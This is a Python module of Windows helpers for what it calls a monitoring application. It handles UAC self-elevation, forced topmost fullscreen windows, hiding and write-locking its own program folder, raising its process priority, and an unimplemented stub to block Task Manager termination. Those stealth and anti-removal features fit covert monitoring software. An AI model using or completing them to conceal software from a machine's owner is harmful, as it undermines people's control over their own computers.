"""
Windows administration utilities for the monitoring application.
Handles UAC elevation and process protection on Windows.
"""

import sys
import os
import ctypes
import subprocess
from ctypes import windll, wintypes

# Only import Windows-specific modules on Windows
if sys.platform == 'win32':
    try:
        import win32api
        import win32process
        import win32security
        import win32con
        WINDOWS_MODULES_AVAILABLE = True
    except ImportError:
        WINDOWS_MODULES_AVAILABLE = False
else:
    WINDOWS_MODULES_AVAILABLE = False


def is_admin():
    """Check if the current process has administrator privileges"""
    if sys.platform != 'win32':
        return False
    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def request_admin():
    """Request administrator privileges by re-running the script with UAC"""
    if sys.platform != 'win32':
        return False
    
    if is_admin():
        return True
    
    try:
        # Re-run the script with admin privileges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    except Exception as e:
        print(f"Failed to request admin: {e}")
        return False


def set_fullscreen(hwnd):
    """Set window to fullscreen mode on Windows"""
    if sys.platform != 'win32':
        return
    
    try:
        import win32gui
        import win32con
        
        # Get screen dimensions
        screen_width = windll.user32.GetSystemMetrics(0)
        screen_height = windll.user32.GetSystemMetrics(1)
        
        # Set window position and size
        windll.user32.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, screen_width, screen_height, 0)
    except Exception as e:
        print(f"Failed to set fullscreen: {e}")


def prevent_task_manager_kill():
    """Prevent the process from being terminated via Task Manager on Windows"""
    if sys.platform != 'win32':
        return
    
    if not WINDOWS_MODULES_AVAILABLE:
        return
    
    try:
        import win32security
        import win32api
        import win32con
        
        # This would require additional implementation with system privileges
        # For now, we'll just return as it requires complex Windows API calls
        pass
    except Exception as e:
        print(f"Failed to prevent task manager kill: {e}")


def hide_program_directory():
    """Hide the program directory from file explorer on Windows"""
    if sys.platform != 'win32':
        return
    
    try:
        import win32api
        import win32con
        
        prog_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Set hidden attribute
        win32api.SetFileAttributes(prog_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
        
        # Set read-only to prevent modifications
        os.chmod(prog_dir, 0o555)
    except Exception as e:
        print(f"Failed to hide program directory: {e}")


def lock_priority():
    """Lock the process priority to prevent manual changes on Windows"""
    if sys.platform != 'win32':
        return
    
    try:
        import os
        import ctypes
        
        pid = os.getpid()
        
        # Set process priority to high
        # Note: Requires admin privileges
        os.system(f"wmic process where processid={pid} call setpriority {128}")
    except Exception as e:
        print(f"Failed to lock priority: {e}")


def protect_process():
    """Apply all protection measures"""
    if sys.platform != 'win32':
        return
    
    # Request admin privileges if not already elevated
    if not is_admin():
        request_admin()
    
    # Hide program directory
    hide_program_directory()
    
    # Lock priority
    lock_priority()
